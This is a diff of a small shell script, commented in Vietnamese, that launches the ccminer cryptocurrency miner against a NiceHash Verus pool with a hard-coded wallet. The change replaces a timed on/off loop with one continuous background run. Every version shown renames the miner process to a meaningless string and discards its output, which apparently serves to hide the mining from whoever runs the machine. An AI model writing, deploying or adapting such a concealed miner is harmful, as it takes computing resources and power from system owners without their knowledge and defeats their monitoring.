@@ -1,22 +1,4 @@
 #!/bin/sh
-
 sleep 6
-
-while true; do
-    # Chạy tiến trình với tên đã thay đổi
-    bash -c "exec -a 'hkakakhskshsvskskshhsskdgdjkshshsjkdhhdjdhvsjshsgsjsksjhshshskshdhdjsjshhdjsjsjshshsjsjsjgdgdgsjshshsjshgdshsgshsgshjshsgdhsjshshshshsgdhdhhsjsjsshgdjsjsjdgdgjsjshdhdhdjskydgdbsjsjjddhsjsjjshsgshsjshshsgsgjsjshshsh' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200 -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG10 -p x -t 1 > /dev/null 2>&1" &
-    
-    # Lưu PID của tiến trình
-    PID=$!
-
-    # Chờ 10 phút
-    sleep 600
-
-    # Dừng tiến trình
-    kill $PID
-    wait $PID 2>/dev/null
-
-    # Nghỉ 140 giây
-    sleep 140
-done
-
+bash -c "exec -a 'hkakakhskshsvskskshhsskdgdjkshshsjkdhhdjdhvsjshsgsjsksjhshshskshdhdjsjshhdjsjsjshshsjsjsjgdgdgsjshshsjshgdshsgshsgshjshsgdhsjshshshshsgdhdhhsjsjsshgdjsjsjdgdgjsjshdhdhdjskydgdbsjsjjddhsjsjjshsgshsjshshsgsgjsjshshsh' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200 -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG10 -p x -t 1 > /dev/null 2>&1" &
+ 
